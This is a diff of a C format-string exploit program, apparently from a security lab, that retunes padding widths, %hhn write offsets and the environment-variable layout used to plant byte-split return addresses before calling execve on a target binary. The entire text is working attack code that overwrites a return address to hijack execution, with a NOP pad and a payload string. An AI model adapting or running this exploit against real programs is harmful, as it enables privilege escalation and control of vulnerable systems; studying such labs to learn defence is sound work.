@@ -9,7 +9,7 @@
 int main(void)
 {
     char *args[3];
-    char *env[33];
+    char *env[42];
 
     // Return address to overwrite
     char *addr = "\xa8\xfe\xa4\x40";   // 0x40a4fea8
@@ -18,7 +18,7 @@ int main(void)
     char *addr_3 = "\xab\xfe\xa4\x40"; // 0x40a4feab
 
     // Define the format string
-    char format_string[125] = "%8x%8x%13x%hhn%100x%hhn%12x%hhn%75x%hhn";
+    char format_string[125] = "%8x%8x%5x%hhn%100x%hhn%20x%hhn%67x%hhn";
     int i;
     while (strlen(format_string) < 124) {
         strcat(format_string, "\x90");
@@ -34,23 +34,23 @@ int main(void)
     args[1] = addr_3; 
     args[2] = NULL;
     
-    for (i = 0; i < 7; ++i) {
+    for (i = 0; i < 11; ++i) {
         env[i] = "\0";
     }
-    env[7] = addr_2;
-    for (i = 8; i < 15; ++i) {
+    env[11] = addr_2;
+    for (i = 12; i < 23; ++i) {
         env[i] = "\0";
     }
-    env[15] = addr;
-    for (i = 16; i < 23; ++i) {
+    env[23] = addr;
+    for (i = 24; i < 35; ++i) {
         env[i] = "\0";
     }
-    env[23] = addr_1;
-    for (i = 24; i < 31; ++i) {
+    env[35] = addr_1;
+    for (i = 36; i < 39; ++i) {
         env[i] = "\0";
     }
-    env[31] = final_string;
-    env[32] = NULL;
+    env[39] = final_string;
+    env[40] = NULL;
 
     if (0 > execve(TARGET, args, env))
         fprintf(stderr, "execve failed.\n");
